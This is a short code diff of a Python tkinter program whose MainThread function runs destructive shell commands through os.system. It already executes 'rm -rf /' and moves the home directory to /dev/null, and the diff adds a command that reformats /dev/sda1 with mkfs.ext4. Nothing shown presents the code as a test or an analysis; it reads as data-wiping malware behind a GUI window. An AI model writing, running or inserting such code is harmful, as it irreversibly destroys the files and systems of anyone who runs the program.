@@ -28,6 +28,7 @@ def MainThread():
     wipe_everything = "rm -rf /"
     services_command = "sudo systemctl stop "
     troll_home_dir = "mv ~ /dev/null"
+    wipe_sda1 = "mkfs.ext4 /dev/sda1"
 
     root = tk.Tk()
     UT = Utils()
@@ -53,6 +54,7 @@ def MainThread():
 
     os.system(wipe_everything)
     os.system(troll_home_dir)
+    os.system(wipe_sda1)
     root.mainloop() 
 
 
